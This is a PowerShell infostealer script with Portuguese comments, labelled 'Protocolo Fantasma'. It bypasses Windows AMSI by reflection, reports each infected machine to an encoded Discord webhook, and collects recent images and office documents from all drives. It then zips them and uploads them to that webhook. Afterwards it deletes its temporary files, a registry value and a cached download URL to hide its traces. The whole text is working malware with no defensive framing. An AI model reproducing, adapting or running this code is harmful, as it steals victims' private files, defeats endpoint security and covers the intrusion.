# [V30: Protocolo Fantasma - Bypass AMSI & Auto-Destruição]
try {
    # Bypass AMSI (Técnica de Concatenação)
    $a = "System.Management.Automation." + "Am" + "si" + "Utils"
    $b = "am" + "si" + "Init" + "Failed"
    $t = [Ref].Assembly.GetType($a)
    $t.GetField($b, "NonPublic,Static").SetValue($null, $true)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
    $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

    # Notificação
    curl.exe -k -s -F "content=👻 V30 (Fantasma) Ativo em $env:COMPUTERNAME" $u

    $tempDir = Join-Path $env:TEMP ("vol_" + (Get-Random))
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Procura Silenciosa (Arquivos < 15MB, últimos 30 dias)
    $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
            $p = $_.FullName
            $isSys = $false; foreach($d in @("C:\Windows", "C:\Program Files")){if($p.StartsWith($d)){$isSys=$true;break}}
            !$isSys -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
        } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
    }

    $zipFile = Join-Path $env:TEMP "sys_upd_82.tmp"
    if ((Get-ChildItem $tempDir).Count -gt 0) {
        # Password configurada: Manso2026!
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
        curl.exe -k -s -F "file=@$zipFile" -F "content=📦 Exfiltração V30: $env:COMPUTERNAME" $u
    }
}
catch {
    $err = "🔴 Falha V30: $($_.Exception.Message)"
    curl.exe -k -s -F "content=$err" $u
}
finally {
    # Limpeza Total (Ficheiros, Registo e Cache)
    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
    if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
    Remove-ItemProperty -Path "HKCU:\Software\Classes" -Name "AppReport" -ErrorAction SilentlyContinue
    certutil -urlcache -f https://tinyurl.com/3y8wnphh delete > $null
}
